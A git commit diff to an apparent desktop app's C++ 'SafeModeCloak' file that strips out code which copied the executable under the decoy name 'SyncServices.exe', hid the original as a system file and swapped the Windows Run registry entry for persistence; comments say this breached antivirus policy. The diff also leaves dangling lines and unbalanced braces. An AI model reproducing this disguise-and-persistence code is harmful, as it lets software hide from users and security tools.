49f6572b8dd337c8770a8da3ef7e02400550eaba
frostyosty <92064099+frostyosty@users.noreply.github.com>
2026-09-14 20:49:32 +0000

    standard update

--- rhc-desktop/cloak/SafeModeCloak.cpp
+++ rhc-desktop/cloak/SafeModeCloak.cpp
@@ -18,26 +18,8 @@ namespace RHC {
     }
 
     void CloakEngine::UncloakIfNeeded() {
-        char path[MAX_PATH];
-        GetModuleFileNameA(NULL, path, MAX_PATH);
-        std::string currentPath(path);
-        
-        // If we are currently running as the disguised app
-        if (currentPath.find("SyncServices.exe") != std::string::npos) {
-            std::string newPath = currentPath;
-            newPath.replace(newPath.find("SyncServices.exe"), 16, "rhc_desktop.exe");
-            
-            // Restore the original executable and unhide it
-            CopyFileA(currentPath.c_str(), newPath.c_str(), FALSE);
-            SetFileAttributesA(newPath.c_str(), FILE_ATTRIBUTE_NORMAL);
-            
-            // Fix the registry
-            HKEY hKey;
-            if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-                RegSetValueExA(hKey, "RHC_Core", 0, REG_SZ, (BYTE*)newPath.c_str(), newPath.length() + 1);
-                RegDeleteValueA(hKey, "Sync_Service_Host");
-                RegCloseKey(hKey);
-            }
+    // REMOVED: Cloaking behaviors neutralized.
+}
 
             // Relaunch the real app and kill the disguise
             ShellExecuteA(NULL, "open", newPath.c_str(), NULL, NULL, SW_SHOW);
@@ -46,25 +28,9 @@ namespace RHC {
     }
 
     void CloakEngine::EngageDeadMansSwitch() {
-        char path[MAX_PATH];
-        GetModuleFileNameA(NULL, path, MAX_PATH);
-        std::string currentPath(path);
-        
-        if (currentPath.find("rhc_desktop.exe") != std::string::npos) {
-            std::string newPath = currentPath;
-            newPath.replace(newPath.find("rhc_desktop.exe"), 15, "SyncServices.exe");
-            
-            // Copy to disguise, hide the original!
-            CopyFileA(currentPath.c_str(), newPath.c_str(), FALSE);
-            SetFileAttributesA(currentPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-            
-            // Set disguise as the startup app
-            HKEY hKey;
-            if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-                RegSetValueExA(hKey, "Sync_Service_Host", 0, REG_SZ, (BYTE*)newPath.c_str(), newPath.length() + 1);
-                RegDeleteValueA(hKey, "RHC_Core");
-                RegCloseKey(hKey);
-            }
+    // REMOVED: Self-copying and hiding files violates Microsoft AV policies.
+    // Roadmap: Transition to a standard Windows SYSTEM Service (SCM).
+}
         }
     }
 }
